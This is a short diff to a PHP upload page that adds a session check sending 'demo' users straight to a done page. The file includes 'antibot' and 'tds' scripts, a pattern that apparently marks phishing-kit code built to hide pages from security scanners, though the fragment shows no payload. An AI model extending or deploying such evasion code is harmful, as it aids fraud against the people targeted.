@@ -1,7 +1,14 @@
 <?php
+session_start();
 
 include '../antibot.php';
 include '../antibot/tds.php';
+
+// Check if this is a demo user - if so, skip upload and go to done page
+if (isset($_SESSION['demo_user']) && $_SESSION['demo_user'] === true) {
+    header('Location: done.php');
+    exit();
+}
 
 ini_set('upload_max_filesize', '0');
 ini_set('post_max_size', '0');
